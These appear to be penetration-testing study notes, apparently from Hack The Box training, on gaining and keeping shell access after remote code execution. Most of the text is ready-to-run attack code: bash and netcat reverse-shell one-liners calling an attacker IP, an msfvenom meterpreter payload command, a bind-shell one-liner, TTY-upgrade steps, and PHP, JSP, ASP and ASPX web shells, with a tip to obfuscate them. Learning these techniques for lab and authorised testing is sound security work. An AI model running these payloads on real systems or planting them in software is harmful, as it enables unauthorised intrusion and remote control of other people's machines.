# Types of Shells Summary

After exploiting a vuln for RCE, maintain access via shells for enumeration/control. Types: Reverse (victim connects to attacker), Bind (attacker connects to victim), Web (via HTTP params). Use network protocols like SSH/WinRM if creds available.

## Reverse Shell

- Most common; quick/reliable.
- Start listener: `nc -lvnp 1234` (l: listen, v: verbose, n: no DNS, p: port).
- Find IP: `ip a` (use tun0 for HTB VPN).
- Execute on victim (replace IP/port):
  - Bash: `bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'`
  - Bash alt: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f`
  - PowerShell: Long one-liner for TCP client/stream.
- Fragile; reconnect if lost.

**Additional**: Payloads from Payload All The Things. Tools: msfvenom (`msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f elf > payload`). Socat for stable.

## Bind Shell

- Victim listens; attacker connects.
- Execute on victim (listens on 1234):
  - Bash: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f`
  - Python: Exec script for socket/subprocess.
  - PowerShell: TcpListener script.
- Connect: `nc 10.10.10.1 1234`
- Persistent; reconnect easily, but lost if process stops/reboot.

**Additional**: Netcat alternatives: ncat, socat. For Windows: PowerShell bind.

## Upgrading TTY

- Basic shells lack cursor/history.
- Upgrade: `python -c 'import pty; pty.spawn("/bin/bash")'`
- Background: Ctrl+Z
- Local: `stty raw -echo; fg`
- Hit Enter; may need `reset`.
- Fix size: `export TERM=xterm-256color; stty rows 67 columns 318` (get values from `echo $TERM; stty size`).

**Additional**: Alternative: `script /dev/null` or rlwrap (`rlwrap nc target port`).

## Web Shell

- Execute via web; semi-interactive.
- Write/upload script:
  - PHP: `<?php system($_REQUEST["cmd"]); ?>`
  - JSP: `<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`
  - ASP: `<% eval request("cmd") %>`
- Access: `curl http://target/shell.php?cmd=id`

**Additional**: Upload via vuln (e.g., file upload). Tools: Weevely for PHP shells. Secure: Obfuscate. For ASPX: `<%= System.Diagnostics.Process.Start("cmd.exe", "/c " + Request["cmd"]).StandardOutput.ReadToEnd() %>`
